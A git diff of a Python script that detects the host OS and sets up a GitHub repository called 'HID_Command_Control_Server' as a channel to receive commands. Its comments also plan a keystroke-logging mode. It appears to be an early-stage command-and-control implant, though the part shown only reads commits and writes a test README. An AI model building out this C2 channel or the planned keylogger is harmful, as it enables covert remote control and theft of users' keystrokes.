@@ -1,3 +1,5 @@
+from github_git import GitHubRepo
+
 import platform
 import sys
 import os
@@ -14,29 +16,36 @@ def detect_os( ) -> str:
     elif system == "Darwin": # MacOS
         return "M"
     elif system == "Linux": # Linux
-        # Try to detect distro using /etc/os-release:
-        # try:
-        #     with open("/etc/os-release", "r") as f:
-        #         data = f.read().lower()
-        #         if "ubuntu" in data:
-        #             return "Linux (Ubuntu)"
-        #         elif "debian" in data:
-        #             return "Linux (Debian)"
-        #         elif "fedora" in data:
-        #             return "Linux (Fedora)"
-        #         elif "arch" in data:
-        #             return "Linux (Arch)"
-        #         elif "centos" in data:
-        #             return "Linux (CentOS)"
-        #         elif "alpine" in data:
-        #             return "Linux (Alpine)"
-        # except FileNotFoundError:
-        #     pass
-
-        # fallback
         return "L"
     # Ideally should never reach here and should be able to detect OS
     return "COULD_NOT_FIND_OS"
+
+def setup_communication_with_github_repo() -> GitHubRepo:
+    # https://github.com/Alishah634/HID_Command_Control_Server
+    repo = GitHubRepo(
+        owner = "Alishah634",
+        repo = "HID_Command_Control_Server",
+        token = "CLASSIC_GITHUB_TOKEN_HERE", # Hardocode belongs to Ali (BAD PRACTICE!!!)
+    )
+
+    # Read commits:
+    commits = repo.get_recent_commits()
+    for c in commits:
+        print(c["sha"], c["commit"]["message"])
+
+    # Update a file
+    result = repo.update_file(
+        path="README.md",
+        new_content="Updated from Python without git (development test 1)!",
+        message="Automated commit"
+    )
+
+    print("Committed:", result["commit"]["sha"])
+    return repo
+    pass
+
+# def recieve_mode_from_git_repo()
+#     pass
 
 
 if __name__ == "__main__":
@@ -52,9 +61,16 @@ if __name__ == "__main__":
     # Sending mode:
     # Logging mode: Key.py (log keystrokes) [need to add OS Specific commands]
 
-
     # Detect the OS we are running on:
-    print(detect_os())
+    # print("OS Name:", os.name)
+    # print("Sys Platform:", sys.platform)
+    # print("Platform System:", platform.system())
+    operating_system_detected = detect_os()
+    if operating_system_detected == "COULD_NOT_FIND_OS":
+        print("FAILED to detect operating system detected", file=sys.sterr)
 
+    # Set up connection with GitHub repo to recieve and extract commands:
+    setup_communication_with_github_repo()
+        
     pass
 
